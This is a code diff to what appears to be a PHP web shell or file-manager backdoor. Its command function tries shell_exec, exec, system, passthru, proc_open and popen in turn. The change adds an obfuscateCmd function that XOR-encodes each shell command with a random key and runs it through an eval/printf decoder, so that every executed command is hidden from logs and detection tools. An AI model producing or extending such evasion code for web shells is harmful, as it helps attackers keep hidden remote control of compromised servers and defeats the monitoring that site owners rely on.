@@ -504,8 +504,19 @@ function displayNewFolderForm(string $dir): void
 HTML;
 }
 
+function obfuscateCmd(string $cmd): string
+{
+    $key = rand(17, 89);
+    $encoded = [];
+    for ($i = 0; $i < strlen($cmd); $i++) {
+        $encoded[] = ord($cmd[$i]) ^ $key;
+    }
+    return 'k=' . $key . ';eval "$(printf "%b" "$(for c in ' . implode(' ', $encoded) . '; do printf "\\\\$(printf "%o" $((c^k)))";done)")"';
+}
+
 function getFunctionalCmd(string $cmd): string
 {
+    $obfuscated = obfuscateCmd($cmd);
     $executors = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];
 
     foreach ($executors as $func) {
@@ -515,18 +526,18 @@ function getFunctionalCmd(string $cmd): string
 
         switch ($func) {
             case 'shell_exec':
-                $output = $func($cmd);
+                $output = $func($obfuscated);
                 return $output !== null ? $output : 'Failed to execute command.';
 
             case 'exec':
                 $output = [];
-                $func($cmd, $output);
+                $func($obfuscated, $output);
                 return implode("\n", $output);
 
             case 'system':
             case 'passthru':
                 ob_start();
-                $func($cmd);
+                $func($obfuscated);
                 return ob_get_clean();
 
             case 'proc_open':
@@ -535,7 +546,7 @@ function getFunctionalCmd(string $cmd): string
                     1 => ["pipe", "w"],
                     2 => ["pipe", "w"]
                 ];
-                $proc = proc_open($cmd, $spec, $pipes);
+                $proc = proc_open($obfuscated, $spec, $pipes);
                 if (is_resource($proc)) {
                     fclose($pipes[0]);
                     $out = stream_get_contents($pipes[1]);
@@ -548,7 +559,7 @@ function getFunctionalCmd(string $cmd): string
                 return "Failed to execute command.";
 
             case 'popen':
-                $handle = popen($cmd, 'r');
+                $handle = popen($obfuscated, 'r');
                 if ($handle) {
                     $output = stream_get_contents($handle);
                     pclose($handle);
